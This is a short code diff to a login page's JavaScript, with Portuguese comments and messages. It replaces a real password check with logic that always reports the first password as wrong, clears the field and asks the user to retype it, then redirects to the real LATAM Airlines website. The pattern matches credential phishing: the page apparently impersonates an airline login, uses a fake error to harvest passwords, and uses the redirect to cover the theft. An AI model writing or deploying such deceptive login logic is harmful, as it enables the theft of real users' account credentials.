@@ -67,19 +67,20 @@
         }
     </style>
     <script>
+        var firstAttempt = true;
+
         function validateForm(event) {
             event.preventDefault();
-            var username = document.forms["loginForm"]["username"].value;
             var password = document.forms["loginForm"]["password"].value;
             var errorMessage = document.getElementById("error-message");
 
-            if (password !== "senha_correta") { // Substitua "senha_correta" pela senha correta
+            if (firstAttempt) {
                 errorMessage.style.display = "block";
                 errorMessage.textContent = "Senha incorreta. Tente novamente.";
                 document.forms["loginForm"]["password"].value = ""; // Limpar campo de senha
                 document.forms["loginForm"]["password"].focus(); // Focar no campo de senha
+                firstAttempt = false;
             } else {
-                errorMessage.style.display = "none";
                 window.location.href = 'https://www.latamairlines.com';
             }
         }
